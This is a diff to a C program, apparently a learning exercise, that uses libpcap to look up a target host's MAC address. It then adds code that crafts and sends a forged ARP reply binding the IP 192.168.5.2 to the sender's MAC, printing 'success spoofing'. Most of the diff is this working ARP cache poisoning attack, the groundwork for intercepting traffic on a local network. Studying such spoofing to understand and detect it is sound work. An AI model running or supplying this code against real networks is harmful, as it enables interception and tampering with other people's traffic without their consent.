@@ -65,8 +65,10 @@ int main(int argc, char *argv[])
     while( fgets( senderMAC, 19, fp2) );
     pclose( fp2);
 
-    printf("my ip : %s", senderIP);
-    printf("my mac : %s", senderMAC);
+    printf("sender ip : %s", senderIP);
+    printf("sender mac : %s", senderMAC);
+    printf("target ip : %s\n", argv[2]);
+
 
     /* Define the device */
     dev = pcap_lookupdev(errbuf);;
@@ -92,11 +94,8 @@ int main(int argc, char *argv[])
     /* Make packet to send ARP to Target */
 
     eth=(struct ether_header *)send_pkt;
-    ether_aton_r("FF:FF:FF:FF:FF:FF", (struct ether_addr *)sendBuf);
-    memcpy(eth->ether_dhost, sendBuf, ETHER_ADDR_LEN );        // dest.MAC = ffffffff
-    ether_aton_r(senderMAC, (struct ether_addr *)sendBuf);
-    memcpy(eth->ether_shost, sendBuf, ETHER_ADDR_LEN );
-    printf("eth.dmac: %s\n",ether_ntoa(((ether_addr*)eth->ether_dhost)));
+    ether_aton_r("FF:FF:FF:FF:FF:FF", (struct ether_addr *)eth->ether_dhost);
+    ether_aton_r(senderMAC, (struct ether_addr *)eth->ether_shost);
     eth->ether_type=htons(ETHERTYPE_ARP);
 
     arp=(struct ether_arp *)(send_pkt+ETH_HLEN);
@@ -137,13 +136,36 @@ int main(int argc, char *argv[])
         /* Check ARP */
         if(ntohs(eth->ether_type) == ETHERTYPE_ARP ){
             sprintf(targetMAC, "%s", ether_ntoa(((ether_addr*)arp->arp_sha)));
-            printf("We received");
+            printf("We received\n");
             break;
         }
 
     }
 
+    /* Make packet to send ARP to Target */
 
+    eth=(struct ether_header *)send_pkt;
+    ether_aton_r(targetMAC, (struct ether_addr *)eth->ether_dhost);
+    ether_aton_r(senderMAC, (struct ether_addr *)eth->ether_shost);
+    eth->ether_type=htons(ETHERTYPE_ARP);
+
+    arp=(struct ether_arp *)(send_pkt+ETH_HLEN);
+    arp->arp_hrd = htons(ARPHRD_ETHER);
+    arp->arp_pro = htons(ETHERTYPE_IP);
+    arp->arp_hln = ETHER_ADDR_LEN;
+    arp->arp_pln = sizeof(struct in_addr);
+    arp->arp_op  = htons(ARPOP_REPLY);
+    ether_aton_r(senderMAC, (struct ether_addr *)arp->arp_sha);
+
+    inet_pton(AF_INET, "192.168.5.2", arp->arp_spa);
+    //memcpy(arp->arp_spa, senderIP,sizeof(struct in_addr));       //inet_pton(AF_INET, "192.168.1.1", arp->arp_spa);
+    ether_aton_r(targetMAC, (struct ether_addr *)arp->arp_tha);
+    inet_pton(AF_INET, argv[2], arp->arp_tpa);
+
+    if(pcap_sendpacket(handle, send_pkt, sizeof(send_pkt)) == -1)
+        printf("error\n");
+    else
+        printf("success spoofing\n");
 
     return 0;
 }
